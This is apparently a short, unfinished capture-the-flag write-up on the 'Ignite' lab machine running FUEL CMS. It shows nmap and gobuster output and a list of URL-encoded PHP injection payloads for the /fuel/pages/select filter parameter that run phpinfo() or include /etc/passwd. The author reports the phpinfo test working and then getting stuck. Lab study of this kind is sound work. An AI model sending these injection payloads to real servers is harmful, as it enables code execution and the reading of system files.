# Ignite -> A new start-up has a few issues with their web server.

```
export IP=10.10.192.215
```

- Took my first look at the `robots.txt` file and got some clues already. :)
- Nmap scan came back and doesnt look encouraging at all.
```
Starting Nmap 7.70 ( https://nmap.org ) at 2020-07-20 16:13 GMT
Nmap scan report for 10.10.192.215
Host is up (0.54s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

```

- Results from gobuster scan.
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 200)
/assets (Status: 301)
/home (Status: 200)
/index.php (Status: 200)
/index (Status: 200)
/offline (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)

```

- Something tells me that `/fuel` path that has a disallowed access is fishy.

- got some payload of the internet 
```
http://10.10.192.215/fuel/pages/select/?nocache=1507880376191&input=&target=&title=&class=&pdfs=&filter=%3C%3F%20phpinfo%28%29%3B%20%20%3F%3E

%3C%3F%20include_path%3D%27/etc/passwd%27%3B%20%20%3F%3E

%3C%3F%20include_path%3D%27/../../../../../etc/passwd%27%3B%20%20%3F%3E

%3C%3F%20include%20%27/etc/passwd%27%3B%20%20%3F%3E

%3C%3F+include+%27%2Fetc%2Fpasswd%27%3B++%3F%3E

%27%2b phpinfo() %2b%27
```

- It works now i just have to build my payload and use it to read some daunting files from the system.
- Ive tried things, nothing works on the website and it gives no info. Went to read some walkthroughs and stuff like that. Even went to look for vulnerabilities associated with the version of fuel cms used but it still gave me headache. I have not given up.. i am just going to learn new ways LOL.

- 
